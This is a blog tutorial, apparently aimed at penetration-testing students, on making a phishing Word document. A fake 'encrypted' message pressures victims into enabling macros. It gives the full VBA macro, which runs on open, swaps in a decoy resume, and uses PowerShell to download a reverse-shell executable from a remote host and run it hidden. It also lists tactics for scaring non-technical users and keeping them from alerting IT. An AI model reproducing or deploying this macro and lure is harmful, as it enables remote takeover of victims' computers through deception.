
---
title: "Create A Phishing Word Document With Macros To Get A Reverse Shell"
layout: single
read_time: true
comments: true
share: true
author_profile: true
header:
  overlay_color: "#000"
  overlay_filter: "0.5"
  overlay_image: /assets/christopher-burns-Kj2SaNHG-hg-unsplash.jpg
excerpt: "<br><br><br>"
categories:
  - Tutorials
tags:
  - cyber security
  - penetration testing
  - oscp
---

## High Level

This post goes hand in hand with How To Make A Reverse Shell With Microsoft Word Macros since this post will not be covering the macro part required for the actual reverse shell. Instead, this post will go over convincing techniques to trick users into enabling macros. By presenting some kind of "masked" information we can convince the user to enable macros under the guise of unmasking said information. In reality we are taking advantage of someone's uncomfortability with technology, presenting them with scary looking text, and instructing them that the only way to see what they intending to click on by enabling the macros. Leveragin VBA we can essentially swap out all the information on the screen for a predefined other set of information. To the user they are "decrypting" the information. To us, we are swapping out text that looks scary for something they are expecting, running our reverse shell, and all because the user thinks they need to enable macros to see the information. You can see where your creativity will come into play in your pursaviness to get someone to click on the right thing. In this scenario we are going to demonstrate a very non-creative way of phishing simply for education streamlining. We will leave the creativity up to you.

## "Encrypted" Text

The first step is purely phishing based. In a new Word document start to put together what you think is a convincing appearance that someone needs to "decrypt" in some way to be able to see the information they want. This could include incorprating things like: a long string of bas64 text, some sayings about this message being encrypted, blurred or fuzzy text, and pictures or watermarks referring to some kind of encryption class. In the example below you can see a very bare bones template. The more convincing and scary your phishing tactics are the more likely someone will click on enable all content without question.

## Insert Picture Here

## The Switch

Once our target enables all content we need to visually switch the text so that it appears as if the document really has been decrypted. This is not only so that the user does not have any concerns or contact their IT Admin but also so that the target will leave the document up and running long enough for our shell to connect. Copy your encrypted text temporarily and begin building what text the user expected to see. For a fake job application you would obviously include contents of a fake resume as to not raise suspicions. Select all of your decrypted text and go to Insert --> Quick Parts --> AutoTexts --> Save Selection to AutoText Gallery. While in "Create New Building Block" create and remember a unqiue name and select OK. Remove your decrypted text and replace it with the encypted text. Next, we will edit our existing macro to switch the text from encrypted to decrypted when macros are enabled.

## Editing Macro

```
Sub MyMacro()
    ActiveDocument.Content.Select
    Selection.Delete
    ActiveDocument.AttachedTemplate.AutoTextEntries("DecryptedText").Insert Where:=Selection.Range, RichText:=True
End Sub
```

We will be inserting this code into our already existing micro. Let us go through how it works and then you can see what the complete macro looks like. ActiveDocument.Content.Select selects all of the existing content, like a ctrl-a command, and is then deleted by Selection.Delete. Next, Word searches for our auto text entry which I have named DecryptedText. Switch out this name for whatever you named your auto text entry.

## Full Macro

```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
   ActiveDocument.Content.Select
   Selection.Delete
   ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert Where:=Selection.Range, RichText:=True
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.1/reverseshell.exe', 'reverseshell.exe')"
    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path + "\reverseshell.exe"
    Wait (2)
    Shell exePath, vbHide

End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```
## Takeaways
Remember to save the document as .doc versus .docx or else this attack will not work properly. This macro still does not employ best practices by downloading the reverse shell instead of loading and executing in memory. For a complete post on this please checkout the blog post: INSERT LINK TO NEXT BLOG HERE
